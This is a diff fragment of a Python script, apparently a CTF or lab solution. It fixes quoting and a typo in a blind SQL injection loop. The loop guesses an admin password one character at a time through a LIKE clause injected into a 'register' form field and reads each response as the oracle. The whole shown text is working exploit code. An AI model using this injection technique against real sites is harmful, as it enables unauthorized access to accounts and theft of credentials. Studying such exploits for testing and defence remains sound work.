@@ -499,8 +499,8 @@ found = False
 while found == False:
 	found = True
 	for i in load:
-		payload = {'register':admin\' and password like \''+prePassword+i+'%'}
-		r = request.post(url, data=payload)
+		payload = {'register':'admin\' and password like \''+prePassword+i+'%'}
+		r = requests.post(url, data=payload)
 		print("trying %s" % (prePassword+i))
 		if not "disabled" in r.content:
 			print r.content
